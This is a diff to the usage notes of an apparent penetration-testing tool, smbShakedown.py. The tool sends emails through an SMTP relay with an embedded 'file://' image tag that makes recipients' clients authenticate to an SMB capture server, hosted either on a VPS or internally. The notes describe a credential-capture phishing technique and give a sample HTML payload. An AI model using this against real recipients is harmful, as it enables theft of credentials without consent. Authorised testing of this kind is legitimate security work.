@@ -10,20 +10,21 @@
 
 #External Pentest
     Virtual Private Server (VPS) recommended.
-    If behind a firewall be sure to enable port forwarding for your SMB Capture Server.
+    If behind a firewall be sure to enable port forwarding for your SMB Capture Server:
     
-    1.Configure SMTP Relay server address.
+    1.Configure SMTP Relay server address:
     
-    2.Enter SMTP Relay server credentials. (anonymous connections not yet supported.)
+    2.Enter SMTP Relay server credentials: 
+    (anonymous connections not yet supported.)
     
-    3.Configure "from" and "to" addresses.
+    3.Configure "from" and "to" addresses:
     
-    4.Enter SMBCapture Server IP address, so it can be placed in body of email 
+    4.Enter SMBCapture Server IP address, so it can be placed in body of email: 
     EX: <img src=file://127.0.0.1/image/foo.gif>
     *Verify this is the external IP address*
     
-    5.SMBCapture Server does not have to be hosted locally.
-    EX:(smbShakedown.py script can be ran locally on one system and a SMBCapture server can be hosted somewhere else like on a VPS server.
+    5.SMBCapture Server does not have to be hosted locally:
+    EX: Use a VPS
 
 #Internal Pentest
     1.Configure SMTP Server, Smarthost/localhost/(Client's Email Server?):
@@ -33,10 +34,11 @@
     
     3.Configure "from" and "to" addresses:
     
-    4.Enter SMBCapture Server IP address, so it can be placed in body of email 
+    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
     EX: <img src=file://127.0.0.1/image/foo.gif>
     
-    5.SMBCapture Server can be hosted locally when testing internal network.
+    5.SMBCapture Server can be hosted locally:
+    EX: Metasploit's SMB Capture server can be configured to automatically launch.
 
 #To do:
     SMTP Anonymous Auth option
